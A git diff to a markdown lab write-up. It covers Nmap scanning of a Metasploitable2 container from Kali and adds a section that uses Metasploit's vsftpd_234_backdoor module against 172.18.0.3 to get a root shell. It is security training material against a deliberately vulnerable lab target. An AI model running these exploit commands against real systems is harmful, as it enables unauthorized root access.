@@ -33,7 +33,7 @@ docker exec -it kali bash
 ```
 ping metasploitable
 ```
-  The IP address that comes back is `172.18.0.3`
+The IP address that comes back is `172.18.0.3`
 
 3. **Run the Nmap scan**:
 ```
@@ -49,4 +49,22 @@ The Nmap scan revealed several services with outdated and vulnerable versions.
 * **IRC**: `UnrealIRCd` running on port `6667/tcp`.
 
 The `vsftpd 2.3.4` version was targeted due to a well-known backdoor vulnerability.
+***
+## Exploitation with Metasploit
+The **Metasploit Framework** was used to exploit the `vsftpd` vulnerability and gain command shell on the target system.
+1. **Launch** `msfconsole`:
+```
+msfconsole
+```
+2. **Search for the exploit**:
+```
+msf6 > search vsftpd
+```
+3. **Search and configure the exploit**: The `vsftpd_234_backdoor` module was chosen.
+```
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > set RHOSTS 172.18.0.3
+msf6 > exploit
+```
+4. **Result**: The exploit successfully created a reverse shell, granting command-line access to the Metasploitable2 container with **root privileges**.
 ***
